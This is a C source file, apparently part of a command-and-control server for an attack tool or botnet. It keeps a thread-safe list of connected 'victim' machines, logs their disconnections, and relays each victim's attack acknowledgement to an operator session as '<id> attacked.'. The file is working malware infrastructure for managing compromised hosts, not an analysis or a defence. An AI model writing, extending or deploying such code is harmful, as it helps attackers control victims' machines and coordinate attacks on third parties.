#include "victim.h"
#include "../util/printlog.h"
#include "session.h"
#include <protocol/protocol.h>

VictimTable victims;
pthread_mutex_t victims_lock;

Victim * victim_new(hio_t * io) {
    static int id = 0;
    Victim * v = malloc(sizeof(Victim));
    if (v) {
        if (pthread_mutex_init(&v->lock, NULL)) {
            free(v);
            return NULL;
        }
        v->next = NULL;
        v->pprev = NULL;
        v->io = io;
        v->id = ++id;
    }
    return v;
}

void victim_on_close(hio_t * io) {
    Victim * v = victim_get_by_io_ptr(io);
    if (v) {
        pthread_mutex_lock(&v->lock);
        int leave_id = v->id;
        if (v->pprev) {
            struct Victim * prev = (struct Victim *)((uintptr_t) v->pprev - offsetof(struct Victim, next));
            pthread_mutex_lock(&prev->lock);
            *(v->pprev) = v->next;
            pthread_mutex_unlock(&prev->lock);
        } else {
            victims = v->next;
        }
        pthread_mutex_unlock(&v->lock);
        pthread_mutex_destroy(&v->lock);
        free(v);
        print_logl("受害者 "CHALK_YELLOW("%d")" 断开连接", leave_id);
    } else {
        event2_print_log(EVENT_LOG_ERR, "无法找到受害者，服务器内部错误。");
    }
}

void victim_on_read(__attribute__((unused)) hio_t * io, void * buf, int readbytes) {
    char * string = buf;
    string[readbytes - 1] = '\0';
    if (!strcmp(string, ATTACK_ACK)) {
        char buf[32] = {0};
        Victim * v = victim_get_by_io_ptr(io);
        if (v) {
            sprintf(buf, CHALK_YELLOW("%d")" attacked.", v->id);
            server_write_msg(session.io, buf);
        } else {
            event2_print_log(EVENT_LOG_ERR, "Unable to find socket. Server internal error.");
        }
    }
}

void victim_free(Victim * victim) {
    if (victim) {
        victim_free(victim->next);
        pthread_mutex_lock(&victim->lock);
        hio_close(victim->io);
        pthread_mutex_unlock(&victim->lock);
        pthread_mutex_destroy(&victim->lock);
        free(victim);
    }
}

VictimsInitResult victims_init() {
    VictimsInitResult res = result_new_ok(0);
    victims = NULL; // 没有受害者
    if (pthread_mutex_init(&victims_lock, NULL)) {
        result_turn_err(res, VictimsInitErrOther);
        return res;
    }
    return res;
}

VictimsAddResult victims_add(hio_t * io) {
    VictimsAddResult res = result_new_ok(0);
    Victim * new_victim = victim_new(io);
    if (new_victim) {
        static unpack_setting_t unpack_setting = {
            .mode = UNPACK_BY_DELIMITER,
            .package_max_length = DEFAULT_PACKAGE_MAX_LENGTH,
            .delimiter = CLE_DELIMITER,
            .delimiter_bytes = CLE_DELIMITER_BYTES
        };
        hio_set_unpack(io, &unpack_setting);
        hio_setcb_read(io, victim_on_read);
        hio_setcb_close(io, victim_on_close);
        hio_read_start(io);
        pthread_mutex_lock(&victims_lock);  // 头插入节点
        if (victims) {
            new_victim->next = victims;
            victims->pprev = &new_victim->next;
        }
        victims = new_victim;
        pthread_mutex_unlock(&victims_lock);
        result_turn_ok(res, new_victim->id);
    } else {
        result_turn_err(res, VictimsAddErrNew);
    }
    return res;
}

Victim * victim_get_by_io_ptr(hio_t * io) {
    Victim * p = victims;
    while (p) {
        if (p->io == io) {
            return p;
        }
        p = p->next;
    }
    return p;
}

Victim * victim_get_by_id(int id) {
    Victim * p = victims;
    while (p) {
        if (p->id == id) {
            return p;
        }
        p = p->next;
    }
    return p;
}

void victims_quit() {
    pthread_mutex_lock(&victims_lock);
    victim_free(victims);
    pthread_mutex_unlock(&victims_lock);
    pthread_mutex_destroy(&victims_lock);
}

